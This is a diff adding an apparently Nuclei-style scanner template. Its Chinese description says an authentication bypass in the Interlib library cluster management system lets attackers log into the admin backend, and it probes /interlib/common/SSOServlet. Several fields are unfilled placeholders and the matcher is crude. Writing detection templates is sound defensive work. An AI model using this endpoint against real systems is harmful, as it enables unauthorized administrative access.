@@ -1,0 +1,18 @@
+id: interlib-SSOServlet-unauthorized
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 广州图创计算机软件开发有限公司图书馆集群管理系统存在逻辑绕过，攻击者可通过此漏洞登录后台。
+  reference:
+    - https://
+  tags: tags
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/interlib/common/SSOServlet?"
+    matchers:
+      - type: word
+        part: header
+        words:
+          - 200
